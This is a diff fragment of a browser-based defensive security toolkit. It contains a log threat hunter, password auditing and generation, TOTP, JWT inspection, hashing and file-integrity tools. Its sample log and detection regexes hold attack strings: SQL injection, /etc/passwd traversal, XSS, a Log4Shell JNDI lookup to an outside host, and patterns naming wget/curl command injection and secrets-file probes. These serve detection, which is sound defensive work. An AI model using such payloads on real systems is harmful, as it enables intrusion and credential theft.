+'192.0.2.66 - - [28/Sep/2026:09:15:10 -0500] "GET /.env HTTP/1.1" 404 162 "-" "Mozilla/5.0 zgrab/0.x"',
+'192.0.2.66 - - [28/Sep/2026:09:15:11 -0500] "GET /.git/config HTTP/1.1" 404 162 "-" "Mozilla/5.0 zgrab/0.x"',
+'192.0.2.66 - - [28/Sep/2026:09:15:12 -0500] "GET /wp-login.php HTTP/1.1" 404 162 "-" "Mozilla/5.0 zgrab/0.x"',
+'192.0.2.66 - - [28/Sep/2026:09:15:14 -0500] "GET /phpmyadmin/ HTTP/1.1" 404 162 "-" "Mozilla/5.0 zgrab/0.x"',
+'203.0.113.99 - - [28/Sep/2026:09:20:33 -0500] "GET /products?id=1%20UNION%20SELECT%20username,password%20FROM%20users HTTP/1.1" 500 0 "-" "sqlmap/1.7.2#stable"',
+'203.0.113.99 - - [28/Sep/2026:09:20:35 -0500] "GET /download?file=../../../../etc/passwd HTTP/1.1" 403 0 "-" "sqlmap/1.7.2#stable"',
+'203.0.113.99 - - [28/Sep/2026:09:20:40 -0500] "GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1" 200 3310 "-" "sqlmap/1.7.2#stable"',
+'198.51.100.23 - - [28/Sep/2026:09:22:05 -0500] "POST /api/login HTTP/1.1" 200 412 "-" "Mozilla/5.0"',
+'45.155.205.12 - - [28/Sep/2026:09:31:00 -0500] "GET /?x=${jndi:ldap://45.155.205.12:1389/a} HTTP/1.1" 400 0 "-" "Mozilla/5.0"'].join('\n');
+const ATTACKS=[
+ {re:/\$\{jndi:/i,n:'Log4Shell (JNDI) exploit attempt',s:'crit'},
+ {re:/\/etc\/passwd|\/etc\/shadow|\/proc\/self|win\.ini|boot\.ini/i,n:'System file read attempt',s:'crit'},
+ {re:/;\s*(wget|curl)\s|\|\s*(ba)?sh\b|`[^`]+`|\bcmd=|\bexec=/i,n:'Command injection attempt',s:'crit'},
+ {re:/union\s+(all\s+)?select|'\s*or\s*'?1'?\s*=\s*'?1|sleep\(\d|benchmark\(|information_schema|waitfor\s+delay/i,n:'SQL injection attempt',s:'high'},
+ {re:/<script|onerror\s*=|onload\s*=|javascript:|alert\(/i,n:'Cross-site scripting attempt',s:'high'},
+ {re:/\.\.\/|\.\.\\/i,n:'Path traversal attempt',s:'high'},
+ {re:/\/\.env|\/\.git|\/\.aws|\/\.ssh|wp-config|config\.php\.bak|\.sql$|\.bak$|backup\.zip/i,n:'Secrets or config file probe',s:'high'},
+ {re:/wp-login\.php|xmlrpc\.php|\/wp-admin/i,n:'WordPress login probe',s:'med'},
+ {re:/phpmyadmin|\/manager\/html|\/actuator|\/console\/|\/solr\/|\/cgi-bin\//i,n:'Admin panel probe',s:'med'}];
+const SCANNER=/sqlmap|nikto|nmap|masscan|zgrab|nuclei|dirbuster|gobuster|wpscan|acunetix|fuzz|hydra|censys|shodan/i;
+
+T({id:'logs',cat:'Threat analysis',gl:'≣',name:'Log Threat Hunter',desc:'Find brute force, logins after failures, web attacks and scanners in SSH and web logs.',render(root,input){
+  root.innerHTML=`<div class="stack"><div><label class="lbl" for="lg-in">Paste auth.log / secure (SSH) or Nginx / Apache access log lines</label><textarea id="lg-in" spellcheck="false" style="min-height:220px"></textarea></div>
+    <div class="row"><button class="btn" id="lg-go">Hunt threats</button><label class="lbl" for="lg-th" style="margin:0">Brute-force threshold</label><input id="lg-th" class="inp" type="number" min="2" max="100" value="5" style="width:80px"></div><div id="lg-out" class="stack"></div></div>`;
+  const inp=$('#lg-in',root),out=$('#lg-out',root);
+  function run(){const lines=inp.value.split('\n').filter(l=>l.trim());const IP=new Map(),f=[];let parsed=0;const th=Math.max(2,+$('#lg-th',root).value||5);
+    const ipo=ip=>{if(!IP.has(ip))IP.set(ip,{ip,req:0,fail:0,ok:0,inv:new Set(),e4:0,e5:0,atk:new Map(),ua:''});return IP.get(ip)};
+    for(const l of lines){let m;
+      if(m=l.match(/Failed (?:password|publickey) for (invalid user )?(\S+) from ([\d.a-f:]+)/i)){parsed++;const o=ipo(m[3]);o.fail++;if(m[1])o.inv.add(m[2])}
+      else if(m=l.match(/Invalid user (\S+) from ([\d.a-f:]+)/i)){parsed++;ipo(m[2]).inv.add(m[1])}
+      else if(m=l.match(/Accepted (\w+) for (\S+) from ([\d.a-f:]+)/i)){parsed++;const o=ipo(m[3]);o.ok++;
+        if(o.fail>=3)f.push({sev:'crit',title:`Successful login after ${o.fail} failures from ${m[3]}`,detail:`User "${m[2]}" logged in via ${m[1]} after repeated failures. Treat this account as compromised: reset credentials and review activity.`});
+        if(m[2]==='root')f.push({sev:'high',title:`Direct root login from ${m[3]}`,detail:'Set PermitRootLogin no in sshd_config and use sudo.'});
+        if(m[1]==='password')o.pw=true}
+      else if(m=l.match(/^(\S+) \S+ \S+ \[([^\]]+)\] "(\S+) (\S+)[^"]*" (\d{3}) (\S+)(?: "([^"]*)" "([^"]*)")?/)){parsed++;const o=ipo(m[1]);o.req++;const st=+m[5];if(st>=400&&st<500)o.e4++;if(st>=500)o.e5++;
+        let path=m[4];try{path+=' '+decodeURIComponent(m[4])}catch{}
+        for(const a of ATTACKS)if(a.re.test(path))o.atk.set(a.n,{s:a.s,c:(o.atk.get(a.n)?.c||0)+1,ok:(o.atk.get(a.n)?.ok)||(st<400)});
+        if(m[8]&&SCANNER.test(m[8]))o.ua=m[8]}}
+    for(const o of IP.values()){
+      if(o.fail>=th)f.push({sev:'high',title:`Brute force from ${o.ip}: ${o.fail} failed logins`,detail:'Block this IP and consider fail2ban or key-only SSH authentication.'});
+      if(o.inv.size>=3)f.push({sev:'med',title:`Username guessing from ${o.ip}`,detail:`Tried ${o.inv.size} usernames that do not exist: ${[...o.inv].slice(0,8).join(', ')}`});
+      for(const[n,a]of o.atk)f.push({sev:a.s,title:`${n} from ${o.ip}`,detail:`${a.c} request${a.c>1?'s':''}.${a.ok?' At least one got a success response: verify the application is not vulnerable.':' Server rejected or errored.'}`});
+      if(o.ua)f.push({sev:'med',title:`Security scanner from ${o.ip}`,detail:`User agent: ${o.ua}`});
+      if(o.req>=10&&o.e4/o.req>0.6)f.push({sev:'med',title:`High 4xx rate from ${o.ip}`,detail:`${o.e4} of ${o.req} requests failed. Typical of directory scanning.`});
+      if(o.e5>=3)f.push({sev:'low',title:`${o.e5} server errors triggered by ${o.ip}`,detail:'Repeated 5xx responses can reveal injection points.'})}
+    if(!parsed){out.innerHTML=errHTML('None of these lines matched SSH or web access log formats. Paste lines from /var/log/auth.log, /var/log/secure, or an Nginx/Apache access log.');return}
+    const bad=[...IP.values()].filter(o=>o.fail>=th||o.atk.size||o.ua).sort((a,b)=>(b.fail+b.atk.size*5)-(a.fail+a.atk.size*5));
+    const worst=f.find(x=>x.sev==='crit')?'crit':f.find(x=>x.sev==='high')?'high':f.length?'med':'ok';
+    out.innerHTML=verdictHTML(f.filter(x=>x.sev!=='ok').length,worst,worst==='ok'?'No threats found':worst==='crit'?'Active compromise indicators':'Attack activity detected',`${parsed} of ${lines.length} lines parsed · ${IP.size} source IPs`)+countsHTML(f)+
+     `<div class="io"><div class="stack"><h3>Findings</h3>${findingsHTML(f)}</div><div class="stack"><h3>Hostile sources</h3>${bad.length?`<div class="tbl-wrap"><table><thead><tr><th>IP</th><th>Failed logins</th><th>Web attacks</th><th>Requests</th></tr></thead><tbody>${bad.map(o=>`<tr><td><code>${esc(o.ip)}</code><br><span class="muted small">${ipToInt(o.ip)!==null?ipScope(ipToInt(o.ip)):'IPv6'}</span></td><td>${o.fail}</td><td>${o.atk.size?[...o.atk.keys()].map(esc).join('<br>'):'—'}</td><td>${o.req}</td></tr>`).join('')}</tbody></table></div>
+     <div class="row"><button class="btn ghost sm" id="lg-bl">Copy block list (iptables)</button><button class="btn ghost sm" id="lg-ips">Copy IPs</button></div>`:'<p class="muted">None.</p>'}</div></div>`;
+    const bl=$('#lg-bl',out),ips=$('#lg-ips',out);
+    if(bl)bl.onclick=e=>copy(bad.map(o=>`iptables -A INPUT -s ${o.ip} -j DROP`).join('\n'),e.target);
+    if(ips)ips.onclick=e=>copy(bad.map(o=>o.ip).join('\n'),e.target)}
+  $('#lg-go',root).onclick=run;$('#lg-th',root).onchange=run;inp.value=input||SAMPLE_LOG;run();
+}});
+
+/* IDENTITY & ACCESS */
+T({id:'password',cat:'Identity & access',gl:'⚿',name:'Password Auditor',desc:'Measure real strength, see crack times, and check breach databases privately.',render(root,input){
+  root.innerHTML=`<div class="io"><div class="stack card">
+    <div><label class="lbl" for="pw-in">Password to test (checked on this device)</label><div class="row"><input id="pw-in" class="inp grow" type="password" autocomplete="off" spellcheck="false"><button class="btn ghost" id="pw-eye">Show</button></div></div>
+    <div class="meter" id="pw-m"><span></span><span></span><span></span><span></span><span></span></div>
+    <div class="row" style="justify-content:space-between"><b id="pw-lbl" class="vt">—</b><span class="muted small" id="pw-bits"></span></div>
+    <div id="pw-ct"></div>
+    <div class="stack" style="gap:8px;border-top:1px solid var(--line);padding-top:14px"><h3 style="margin:0">Breach check</h3>
+      <p class="muted small">Checks Have I Been Pwned using k-anonymity: only the first 5 characters of the password's SHA-1 hash leave this device, never the password.</p>
+      <div class="row"><button class="btn" id="pw-hibp">Check breaches</button></div><div id="pw-hr"></div></div>
+  </div><div class="stack"><h3>Findings</h3><div id="pw-f"></div></div></div>`;
+  const inp=$('#pw-in',root),labels=['Very weak','Weak','Fair','Strong','Very strong'],cols=['crit','high','med','ok','ok'];
+  function run(){const r=analyzePassword(inp.value);$('#pw-hr',root).innerHTML='';
+    if(!r){$('#pw-lbl',root).textContent='—';$('#pw-bits',root).textContent='';$('#pw-ct',root).innerHTML='';$('#pw-f',root).innerHTML='<p class="muted">Type a password to audit it.</p>';$$('#pw-m span',root).forEach(s=>s.style.background='');return}
+    $$('#pw-m span',root).forEach((s,i)=>s.style.background=i<=r.score?`var(--${cols[r.score]})`:'');
+    const L=$('#pw-lbl',root);L.textContent=labels[r.score];L.className='vt s-'+cols[r.score];
+    $('#pw-bits',root).textContent=`${r.len} chars · ~${Math.round(r.bits)} bits`;
+    const g=2**r.bits/2;
+    $('#pw-ct',root).innerHTML=`<div class="tbl-wrap"><table><thead><tr><th>Attack scenario</th><th>Time to crack</th></tr></thead><tbody>
+      <tr><td>Online login, rate-limited (10 guesses/s)</td><td>${fmtDur(g/10)}</td></tr>
+      <tr><td>Leaked database, bcrypt (10k/s)</td><td>${fmtDur(g/1e4)}</td></tr>
+      <tr><td>Leaked database, fast hash on GPU rig (100B/s)</td><td>${fmtDur(g/1e11)}</td></tr></tbody></table></div>`;
+    $('#pw-f',root).innerHTML=findingsHTML(r.f)}
+  inp.oninput=run;$('#pw-eye',root).onclick=e=>{const s=inp.type==='password';inp.type=s?'text':'password';e.target.textContent=s?'Hide':'Show'};
+  $('#pw-hibp',root).onclick=async()=>{const hr=$('#pw-hr',root);if(!inp.value){hr.innerHTML=errHTML('Enter a password first.');return}
+    hr.innerHTML='<p class="muted small">Checking…</p>';const h=(await sha('SHA-1',enc.encode(inp.value))).toUpperCase(),pre=h.slice(0,5),suf=h.slice(5);
+    try{const r=await fetch('https://api.pwnedpasswords.com/range/'+pre,{headers:{'Add-Padding':'true'}});if(!r.ok)throw 0;const t=await r.text();
+      const line=t.split('\n').find(l=>l.startsWith(suf));const n=line?+line.split(':')[1]:0;
+      hr.innerHTML=n>0?`<div class="banner s-crit">Found in ${n.toLocaleString('en-US')} breached password lists. Do not use this password anywhere.</div>`:'<div class="banner s-ok">Not found in known breaches. Still use it on one site only.</div>'}
+    catch{hr.innerHTML=`<div class="banner s-med">Could not reach the breach database from this page. The check works when X09 Defense runs on its own domain.<br><span class="small muted">Hash prefix sent would be: ${pre}</span></div>`}};
+  inp.value=input&&!/\s/.test(input)?input:'Summer2024!';run();
+}});
+
+const WORDLIST='acid acorn agent alarm album alpha amber anchor angle apple april arena argon armor arrow atlas atom autumn axis badge bagel baker bamboo banjo barley basil beacon beaver bench berry bishop blade blaze blossom bolt bonus boulder bracket breeze brick bridge bronze brook bucket buffalo bugle cabin cactus camel canal candle canyon carbon cargo castle cedar cellar cement chalk cheetah cherry chess cider cinema circuit citrus civic clover cobalt cocoa comet copper coral cosmos cotton coyote crane crater cricket crystal cycle dagger dawn delta denim desert diesel dingo dolphin domino dragon drift drum eagle echo eclipse elbow ember emerald engine epoch falcon fern ferry fiber fiddle filter flame flint forest fossil fox frost galaxy garnet gecko geyser ginger glacier globe granite gravel guitar hammer harbor harvest hazel helmet heron hollow honey horizon hornet iceberg igloo indigo iron island ivory jacket jaguar jasmine jelly jungle kayak kernel kettle koala lagoon lantern laser lemon lever lilac lime linen lizard lobster lotus lunar magnet mango maple marble meadow meteor mint mirror mocha monsoon mosaic motor nectar needle neon nickel nomad nutmeg oasis ocean olive onyx orbit orchid otter oyster paddle panda paper parrot pebble pepper piano pilot pixel planet plasma plum polar pony prism pulsar puzzle quartz quill radar radio raven reef ribbon river rocket ruby saddle salmon satchel saturn scarlet shadow shell signal silver sketch slate solar sonic spark sphinx spruce squid summit sunset tango thistle thunder tiger timber topaz tornado tractor tulip tundra turbo turtle twilight umbra valley vapor velvet violet vortex walnut willow wizard yarn zebra zenith zephyr zinc'.split(' ');
+T({id:'generate',cat:'Identity & access',gl:'✱',name:'Password Generator',desc:'Cryptographically random passwords and passphrases with unbiased selection.',render(root){
+  root.innerHTML=`<div class="io"><div class="card stack">
+    <div class="tabs" role="tablist"><button class="tab" role="tab" data-m="pw" aria-selected="true">Password</button><button class="tab" role="tab" data-m="pp" aria-selected="false">Passphrase</button></div>
+    <div id="gn-pw" class="stack"><div><label class="lbl" for="gn-len">Length: <b id="gn-lv">20</b></label><input id="gn-len" type="range" min="8" max="64" value="20"></div>
+      <div class="row"><label class="check"><input type="checkbox" id="gn-u" checked> A–Z</label><label class="check"><input type="checkbox" id="gn-l" checked> a–z</label><label class="check"><input type="checkbox" id="gn-d" checked> 0–9</label><label class="check"><input type="checkbox" id="gn-s" checked> Symbols</label><label class="check"><input type="checkbox" id="gn-a" checked> No look-alikes (0 O l 1 I)</label></div></div>
+    <div id="gn-pp" class="stack" hidden><div><label class="lbl" for="gn-w">Words: <b id="gn-wv">6</b></label><input id="gn-w" type="range" min="4" max="10" value="6"></div>
+      <div class="row"><label class="lbl" for="gn-sep" style="margin:0">Separator</label><select id="gn-sep" style="width:auto"><option value="-">hyphen</option><option value=".">dot</option><option value=" ">space</option><option value="_">underscore</option></select><label class="check"><input type="checkbox" id="gn-cap" checked> Capitalize</label><label class="check"><input type="checkbox" id="gn-num" checked> Add a number</label></div></div>
+    <div class="row"><button class="btn" id="gn-go">Generate</button><label class="lbl" for="gn-n" style="margin:0">How many</label><input id="gn-n" class="inp" type="number" min="1" max="50" value="5" style="width:70px"></div>
+  </div><div class="stack"><div class="row"><h3 style="margin:0">Results</h3><span style="flex:1"></span><span class="muted small" id="gn-e"></span></div><div id="gn-out" class="stack" style="gap:8px"></div></div></div>`;
+  let mode='pw';
+  $$('.tab',root).forEach(t=>t.onclick=()=>{mode=t.dataset.m;$$('.tab',root).forEach(x=>x.setAttribute('aria-selected',x===t));$('#gn-pw',root).hidden=mode!=='pw';$('#gn-pp',root).hidden=mode!=='pp';run()});
+  function one(){if(mode==='pp'){const n=+$('#gn-w',root).value,sep=$('#gn-sep',root).value;let w=Array.from({length:n},()=>WORDLIST[rint(WORDLIST.length)]);
+      if($('#gn-cap',root).checked)w=w.map(x=>x[0].toUpperCase()+x.slice(1));if($('#gn-num',root).checked)w[rint(n)]+=rint(100);return w.join(sep)}
+    let sets=[];if($('#gn-u',root).checked)sets.push('ABCDEFGHIJKLMNOPQRSTUVWXYZ');if($('#gn-l',root).checked)sets.push('abcdefghijklmnopqrstuvwxyz');if($('#gn-d',root).checked)sets.push('0123456789');if($('#gn-s',root).checked)sets.push('!@#$%^&*()-_=+[]{};:,.?/');
+    if($('#gn-a',root).checked)sets=sets.map(s=>s.replace(/[0Ol1I]/g,''));if(!sets.length)return null;
+    const all=sets.join(''),len=+$('#gn-len',root).value;let out;do{out=Array.from({length:len},()=>all[rint(all.length)])}while(len>=sets.length&&!sets.every(s=>out.some(c=>s.includes(c))));return out.join('')}
+  function entropy(){if(mode==='pp')return +$('#gn-w',root).value*Math.log2(WORDLIST.length)+($('#gn-num',root).checked?6.6:0);
+    let n=0;[['#gn-u',26],['#gn-l',26],['#gn-d',10],['#gn-s',24]].forEach(([id,c])=>{if($(id,root).checked)n+=c});if($('#gn-a',root).checked)n-=5;return +$('#gn-len',root).value*Math.log2(Math.max(n,2))}
+  function run(){$('#gn-lv',root).textContent=$('#gn-len',root).value;$('#gn-wv',root).textContent=$('#gn-w',root).value;const n=Math.min(50,Math.max(1,+$('#gn-n',root).value||1));
+    const list=Array.from({length:n},one);if(list[0]===null){$('#gn-out',root).innerHTML=errHTML('Pick at least one character set.');return}
+    $('#gn-e',root).textContent=`~${Math.round(entropy())} bits of entropy each`;
+    $('#gn-out',root).innerHTML=list.map((p,i)=>`<div class="row" style="flex-wrap:nowrap"><code class="grow" style="padding:9px 11px;font-size:14px">${esc(p)}</code><button class="btn ghost sm" data-i="${i}">Copy</button></div>`).join('');
+    $('#gn-out',root).onclick=e=>{if(e.target.dataset.i)copy(list[e.target.dataset.i],e.target)}}
+  $$('input,select',root).forEach(x=>x.addEventListener('input',run));$('#gn-go',root).onclick=run;run();
+}});
+
+T({id:'totp',cat:'Identity & access',gl:'⏱',name:'2FA Code Lab',desc:'Generate and verify TOTP codes, create secrets and otpauth:// setup links.',render(root,input){
+  root.innerHTML=`<div class="io"><div class="card stack">
+    <div><label class="lbl" for="tp-s">Secret key (Base32)</label><div class="row"><input id="tp-s" class="inp grow" spellcheck="false" autocomplete="off"><button class="btn ghost" id="tp-new">New secret</button></div></div>
+    <div class="row"><div class="grow"><label class="lbl" for="tp-acc">Account label</label><input id="tp-acc" class="inp" value="admin@example.com"></div><div class="grow"><label class="lbl" for="tp-iss">Issuer</label><input id="tp-iss" class="inp" value="X09 Defense"></div></div>
+    <div><label class="lbl">Setup link (paste into a QR generator or password manager)</label><div class="row" style="flex-wrap:nowrap"><code id="tp-uri" class="grow" style="padding:9px 11px"></code><button class="btn ghost sm" id="tp-cu">Copy</button></div></div>
+  </div><div class="stack">
+    <div class="card stack" style="align-items:flex-start"><h3 style="margin:0">Current code</h3><div class="big-code" id="tp-code">------</div><div class="bar" style="width:100%"><i id="tp-bar"></i></div><div class="muted small" id="tp-meta"></div></div>
+    <div class="card stack"><label class="lbl" for="tp-v" style="margin:0">Verify a code from an authenticator app</label><div class="row"><input id="tp-v" class="inp" inputmode="numeric" maxlength="6" placeholder="123456" style="width:130px"><button class="btn" id="tp-vb">Verify</button></div><div id="tp-vr"></div></div>
+  </div></div>`;
+  const s=$('#tp-s',root);let key=null;
+  const newSecret=()=>{const b=new Uint8Array(20);crypto.getRandomValues(b);s.value=b32enc(b).match(/.{4}/g).join(' ');upd()};
+  function upd(){try{key=b32dec(s.value);if(key.length<10)throw Error('Secret is too short. Use at least 16 Base32 characters (80 bits); 32 is standard.');
+      const clean=s.value.toUpperCase().replace(/[\s=-]/g,'');const iss=$('#tp-iss',root).value,acc=$('#tp-acc',root).value;
+      $('#tp-uri',root).textContent=`otpauth://totp/${encodeURIComponent(iss)}:${encodeURIComponent(acc)}?secret=${clean}&issuer=${encodeURIComponent(iss)}&algorithm=SHA1&digits=6&period=30`;tick()}
+    catch(e){key=null;$('#tp-code',root).textContent='------';$('#tp-meta',root).innerHTML=`<span class="s-crit">${esc(e.message)}</span>`}}
+  async function tick(){if(!key)return;const now=Date.now()/1000,c=Math.floor(now/30),left=30-(now%30);
+    const [p,cur,n]=await Promise.all([hotp(key,c-1),hotp(key,c),hotp(key,c+1)]);
+    $('#tp-code',root).textContent=cur.slice(0,3)+' '+cur.slice(3);$('#tp-bar',root).style.width=(left/30*100)+'%';
+    $('#tp-meta',root).textContent=`Refreshes in ${Math.ceil(left)}s · previous ${p} · next ${n}`}
+  $('#tp-vb',root).onclick=async()=>{const v=$('#tp-v',root).value.replace(/\D/g,''),r=$('#tp-vr',root);if(!key){r.innerHTML=errHTML('Enter a valid secret first.');return}
+    const c=Math.floor(Date.now()/30000);for(const d of[0,-1,1])if(await hotp(key,c+d)===v){r.innerHTML=`<div class="banner s-ok">Valid${d?` (${d<0?'previous':'next'} 30-second window, check clock drift)`:''}</div>`;return}
+    r.innerHTML='<div class="banner s-crit">Invalid code. Check the secret and that the device clock is correct.</div>'};
+  $('#tp-cu',root).onclick=e=>copy($('#tp-uri',root).textContent,e.target);
+  $('#tp-new',root).onclick=newSecret;s.oninput=upd;$('#tp-acc',root).oninput=upd;$('#tp-iss',root).oninput=upd;
+  const iv=setInterval(tick,1000);cleanup=()=>clearInterval(iv);
+  if(input){s.value=input;upd()}else newSecret();
+}});
+
+T({id:'jwt',cat:'Identity & access',gl:'◇',name:'JWT Inspector',desc:'Decode tokens, flag dangerous claims, verify HMAC signatures and test for weak secrets.',render(root,input){
+  root.innerHTML=`<div class="stack"><div><label class="lbl" for="jw-in">JSON Web Token</label><textarea id="jw-in" spellcheck="false" style="min-height:90px"></textarea></div>
+    <div class="row"><input id="jw-sec" class="inp grow" placeholder="HMAC secret to verify (optional)" autocomplete="off" spellcheck="false"><button class="btn" id="jw-go">Inspect</button></div><div id="jw-out" class="stack"></div></div>`;
+  const inp=$('#jw-in',root),out=$('#jw-out',root);
+  async function hs(alg,secret,data){const k=await crypto.subtle.importKey('raw',enc.encode(secret),{name:'HMAC',hash:'SHA-'+alg.slice(2)},false,['sign']);return b64url(new Uint8Array(await crypto.subtle.sign('HMAC',k,enc.encode(data))))}
+  async function run(){let j;try{j=parseJwt(inp.value)}catch(e){out.innerHTML=errHTML(e.message);return}
+    const f=jwtFindings(j.h,j.pl,j.sig),alg=String(j.h.alg||'');let sigRes='';
+    if(/^HS(256|384|512)$/.test(alg)&&j.sig){for(const w of WEAK_SECRETS)if(await hs(alg,w,j.signing)===j.sig){f.unshift({sev:'crit',title:`Signed with a guessable secret: "${w}"`,detail:'Anyone can forge valid tokens for this service. Rotate to a random secret of at least 32 bytes now.'});break}
+      const sec=$('#jw-sec',root).value;if(sec)sigRes=await hs(alg,sec,j.signing)===j.sig?'<div class="banner s-ok">Signature valid for this secret.</div>':'<div class="banner s-crit">Signature does not match this secret.</div>'}
+    else if($('#jw-sec',root).value&&alg)sigRes=`<div class="banner s-med">${esc(alg)} uses a public/private key pair. Verification here supports HS256, HS384 and HS512 only.</div>`;
+    const tsAnn=o=>JSON.stringify(o,null,2).replace(/"(exp|iat|nbf|auth_time)": (\d{9,11})/g,(m,k,v)=>`${m}  ← ${new Date(v*1000).toLocaleString()}`);
+    const worst=SEV_ORDER.find(s=>f.some(x=>x.sev===s))||'ok';
+    out.innerHTML=verdictHTML(esc(alg||'none'),worst==='info'||worst==='low'?'ok':worst,worst==='crit'?'Token is unsafe':worst==='high'?'Serious weaknesses':worst==='med'?'Needs attention':'No serious issues','Signing algorithm')+sigRes+
+      `<div class="io"><div class="stack"><h3>Findings</h3>${findingsHTML(f)}</div><div class="stack"><div><h3>Header</h3><pre>${esc(tsAnn(j.h))}</pre></div><div><h3>Payload</h3><pre>${esc(tsAnn(j.pl))}</pre></div><div><h3>Signature</h3><pre>${esc(j.sig||'(empty)')}</pre></div></div></div>`}
+  $('#jw-go',root).onclick=run;inp.oninput=run;
+  if(input){inp.value=input;run()}else{const h=b64url(enc.encode(JSON.stringify({alg:'HS256',typ:'JWT'}))),p=b64url(enc.encode(JSON.stringify({sub:'user_4821',name:'Jordan Lee',role:'admin',iat:1790000000,exp:1821536000})));
+    hs('HS256','secret',h+'.'+p).then(s=>{inp.value=h+'.'+p+'.'+s;run()})}
+}});
+
+/* CRYPTO & INTEGRITY */
+T({id:'hash',cat:'Crypto & integrity',gl:'#',name:'Hash Lab',desc:'Hash text with five algorithms, identify unknown hashes, and compare digests.',render(root,input){
+  root.innerHTML=`<div class="stack"><div class="tabs" role="tablist"><button class="tab" data-t="gen" aria-selected="true">Generate</button><button class="tab" data-t="id" aria-selected="false">Identify</button><button class="tab" data-t="cmp" aria-selected="false">Compare</button></div>
+   <div data-p="gen" class="io"><div><label class="lbl" for="hs-in">Text to hash (UTF-8)</label><textarea id="hs-in" spellcheck="false" style="min-height:140px">X09 Defense</textarea></div><div id="hs-out" class="stack" style="gap:10px"></div></div>
+   <div data-p="id" class="stack" hidden><div><label class="lbl" for="hi-in">Unknown hash</label><input id="hi-in" class="inp" spellcheck="false"></div><div id="hi-out"></div></div>
+   <div data-p="cmp" class="stack" hidden><div class="io"><div><label class="lbl" for="hc-a">Hash A</label><input id="hc-a" class="inp" spellcheck="false"></div><div><label class="lbl" for="hc-b">Hash B</label><input id="hc-b" class="inp" spellcheck="false"></div></div><div id="hc-out"></div></div></div>`;
+  const tabs=$$('.tab',root);const show=t=>{tabs.forEach(x=>x.setAttribute('aria-selected',x.dataset.t===t));$$('[data-p]',root).forEach(p=>p.hidden=p.dataset.p!==t)};tabs.forEach(t=>t.onclick=()=>show(t.dataset.t));
+  async function gen(){const b=enc.encode($('#hs-in',root).value);const r=[['MD5',md5(b)],['SHA-1',await sha('SHA-1',b)],['SHA-256',await sha('SHA-256',b)],['SHA-384',await sha('SHA-384',b)],['SHA-512',await sha('SHA-512',b)]];
+    $('#hs-out',root).innerHTML=r.map(([n,h],i)=>`<div><div class="row" style="justify-content:space-between"><span class="lbl" style="margin:0">${n}${i<2?' <span class="s-high small">· legacy</span>':''}</span><button class="btn ghost sm" data-h="${h}">Copy</button></div><pre style="margin-top:4px">${h}</pre></div>`).join('')}
+  $('#hs-out',root).onclick=e=>{if(e.target.dataset.h)copy(e.target.dataset.h,e.target)};
+  function ident(){const v=$('#hi-in',root).value.trim(),r=identifyHash(v);$('#hi-out',root).innerHTML=!v?'':r.length?findingsHTML(r.map(([t,d,s])=>({sev:s,title:t,detail:d}))):errHTML('No known hash format matches. Check for missing characters or extra spaces.')}
+  function cmp(){const a=$('#hc-a',root).value.trim().toLowerCase(),b=$('#hc-b',root).value.trim().toLowerCase();$('#hc-out',root).innerHTML=!a||!b?'<p class="muted">Paste two hashes to compare them.</p>':a===b?'<div class="banner s-ok">Match. The hashes are identical.</div>':`<div class="banner s-crit">Mismatch. First difference at character ${[...a].findIndex((c,i)=>c!==b[i])+1}.</div>`}
+  $('#hs-in',root).oninput=gen;$('#hi-in',root).oninput=ident;$('#hc-a',root).oninput=cmp;$('#hc-b',root).oninput=cmp;
+  gen();cmp();if(input){$('#hi-in',root).value=input;show('id')}else $('#hi-in',root).value='$2b$12$R9h/cIPz0gi.URNNX3kh2OPST9/PgBkqquzi.Ss7KIUgO2t0jWMUW';ident();
+}});
+
+T({id:'file',cat:'Crypto & integrity',gl:'▣',name:'File Integrity Check',desc:'Hash a download and confirm it matches the checksum the vendor published.',render(root){
+  root.innerHTML=`<div class="io"><div class="stack"><label class="drop" id="fi-drop" for="fi-in"><b style="color:var(--fg)">Drop a file here</b><br><span class="small">or click to choose. The file is read on this device and never uploaded.</span></label><input type="file" id="fi-in" hidden>
+    <div><label class="lbl" for="fi-exp">Expected checksum from the vendor (any algorithm)</label><input id="fi-exp" class="inp" spellcheck="false" placeholder="e.g. 3f2a… from the download page"></div><div id="fi-ban"></div></div>
+    <div class="stack"><h3>Digests</h3><div id="fi-out" class="stack" style="gap:10px"><p class="muted">No file chosen yet. Results show MD5, SHA-1, SHA-256 and SHA-512.</p></div></div></div>`;
+  let H=null;const drop=$('#fi-drop',root);
+  async function load(file){if(!file)return;$('#fi-out',root).innerHTML='<p class="muted">Hashing…</p>';const b=new Uint8Array(await file.arrayBuffer());
+    H={MD5:md5(b),'SHA-1':await sha('SHA-1',b),'SHA-256':await sha('SHA-256',b),'SHA-512':await sha('SHA-512',b)};
+    $('#fi-out',root).innerHTML=`<div class="card">${kvHTML({Name:esc(file.name),Size:file.size.toLocaleString('en-US')+' bytes',Type:esc(file.type||'unknown'),Modified:new Date(file.lastModified).toLocaleString()})}</div>`+Object.entries(H).map(([n,h])=>`<div><span class="lbl">${n}</span><pre>${h}</pre></div>`).join('');cmp()}
+  function cmp(){const e=$('#fi-exp',root).value.trim().toLowerCase().replace(/^.*?([a-f0-9]{32,128}).*$/,'$1'),b=$('#fi-ban',root);if(!e||!H){b.innerHTML='';return}
+    const m=Object.entries(H).find(([,h])=>h===e);b.innerHTML=m?`<div class="banner s-ok">Verified: ${m[0]} matches. This file is exactly what the vendor published.</div>`:'<div class="banner s-crit">Does not match. Do not run this file. It may be corrupted or tampered with.</div>'}
+  $('#fi-in',root).onchange=e=>load(e.target.files[0]);$('#fi-exp',root).oninput=cmp;
+  drop.ondragover=e=>{e.preventDefault();drop.classList.add('over')};drop.ondragleave=()=>drop.classList.remove('over');
+  drop.ondrop=e=>{e.preventDefault();drop.classList.remove('over');load(e.dataTransfer.files[0])};
+}});
+
+T({id:'vault',cat:'Crypto & integrity',gl:'▤',name:'Encrypted Notes',desc:'Encrypt text with AES-256-GCM and a passphrase before you send or store it.',render(root,input){
+  root.innerHTML=`<div class="stack"><div class="tabs"><button class="tab" data-t="e" aria-selected="true">Encrypt</button><button class="tab" data-t="d" aria-selected="false">Decrypt</button></div>
+   <div class="io"><div class="stack"><div><label class="lbl" for="vt-in" id="vt-l">Secret text</label><textarea id="vt-in" spellcheck="false"></textarea></div>
+     <div><label class="lbl" for="vt-p">Passphrase</label><input id="vt-p" class="inp" type="password" autocomplete="new-password"></div><div class="row"><button class="btn" id="vt-go">Encrypt</button></div></div>
